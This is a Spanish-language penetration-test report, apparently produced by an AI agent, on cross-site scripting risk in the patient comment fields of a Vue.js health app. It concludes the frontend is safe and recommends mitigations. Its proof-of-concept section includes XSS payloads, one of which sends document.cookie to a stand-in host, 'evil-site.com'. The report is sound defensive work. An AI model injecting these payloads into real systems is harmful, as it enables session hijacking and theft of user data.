# ⚔️ Reporte de Penetration Test: Simulación XSS en Campos de Entrada

**Agente:** Penetration Tester  
**Fecha:** 20 de Enero, 2026  
**Objetivo:** Simular y analizar vulnerabilidades Cross-Site Scripting (XSS) en los campos de texto libre ("Comentarios") del módulo de pacientes.

---

## 1. Alcance y Reconocimiento

Se identificaron los siguientes puntos de entrada de texto libre que corresponden a la descripción "Comentarios de Paciente" o similar (datos cualitativos):

- **Archivo Objetivo:** `src/components/onboarding/PasoHabitos.vue`
- **Campos Vulnerables (Potenciales):**
  - `formularioLocal.nutricion.preferencias` (Textarea)
  - `formularioLocal.nutricion.alergias` (Textarea)

> **Nota:** Aunque el código usa Vue.js (que escapa HTML por defecto), estos campos son vectores comunes para **Stored XSS** si el backend o un panel de administración visualiza estos datos sin sanitización.

---

## 2. Simulación de Ataque (Proof of Concept)

A continuación se detallan los vectores de ataque simulados que un actor malicioso intentaría inyectar en estos campos.

### Vector A: Inyección de Script Básico (Reflected/Stored XSS)

**Payload:**

```javascript
<script>alert('XSS: Cookies robadas: ' + document.cookie)</script>
```

**Escenario de Éxito:** Si el sistema guarda esto y luego un administrador ve la ficha del paciente en un panel que use `innerHTML` o `v-html` inseguro, se ejecutará el JavaScript, permitiendo el robo de sesión del administrador.

### Vector B: Event Handlers en Tags HTML (Bypass de filtros simples)

**Payload:**

```html
<img
  src="x"
  onerror="fetch('https://evil-site.com?cookie=' + document.cookie)"
/>
```

**Escenario:** Este ataque no requiere etiquetas `<script>`. Se ejecuta automáticamente al intentar cargar la imagen rota cuando se renderiza el comentario.

### Vector C: Inyección Políglota (Compleja)

**Payload:**

```javascript
javascript://%250Aalert(1)//" autofocus onfocus=alert(1) src=1 onerror=alert(1)
```

**Escenario:** Intenta romper múltiples contestos (atributos, scripts, URL).

---

## 3. Análisis de Vulnerabilidad (Código Actual)

Se realizó una auditoría estática del código fuente para verificar si estos ataques tendrían éxito en la versión actual de **Mio-Web**.

### evidencias:

1.  **Frontend Rendering (`PasoHabitos.vue`):**
    - Los campos usan el componente `<Textarea>` de PrimeVue y se vinculan con `v-model`.
    - **Resultado:** Vue.js trata automáticamente el input como texto plano. Si se inyecta `<script>`, se mostrará literalmente el texto `<script>`, **no se ejecutará**.
2.  **Búsqueda de Sinks Peligrosos (`v-html` / `innerHTML`):**
    - Se escaneó todo el directorio `src` buscando uso de `v-html` (que permitiría la inyección).
    - **Resultado:** 0 coincidencias encontradas.
3.  **Almacenamiento (`tiendaIncorporacion.js`):**
    - El store guarda los datos tal cual (`text/plain`). No hay sanitización en el cliente (lo cual es aceptable si el _renderizado_ es seguro, pero riesgoso para el backend).

### Conclusión Técnica

El frontend de **Mio-Web es actualmente SEGURO** contra la ejecución de estos ataques XSS en la vista del propio paciente, debido a la arquitectura segura de Vue.js y la ausencia de directivas `v-html`.

**🚨 RIESGO LATENTE (Backend/Admin):**
El riesgo real reside en **dónde se consumen estos datos**. Si la API de Homa (`apihoma`) o un panel de administración (CRM, Backoffice) muestra estas "Alergias/Preferencias" sin escapar el HTML, **el ataque será exitoso allí**.

---

## 4. Recomendaciones de Mitigación

Para asegurar la robustez completa (Defensa en Profundidad), se recomienda implementar:

### 4.1 Sanitización a la Salida (Output Encoding)

Mantener la práctica actual de **NUNCA** usar `v-html` para mostrar datos generados por el usuario. Usar siempre `{{ variable }}` (interpolación de texto).

### 4.2 Validación a la Entrada (Input Validation)

Limitar los caracteres permitidos en los campos de comentarios.

- **Acción:** Restringir el input en `PasoHabitos.vue`.
- **Regla:** Solo permitir alfanuméricos y puntuación básica. Bloquear `< >`.

```javascript
// Ejemplo de validador sugerido
const esInputSeguro = (texto) => {
  const patronPeligroso = /<[^>]*>/g;
  return !patronPeligroso.test(texto);
};
```

### 4.3 Headers de Seguridad (Content Security Policy)

Implementar CSP estricto en el servidor de producción para evitar que, incluso si hay una inyección, el navegador ejecute scripts no autorizados.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;
```

---

**Estado Final de la Prueba:** ✅ **BLOQUEADO (En Cliente)** / ⚠️ **SIN VERIFICAR (En Backend)**
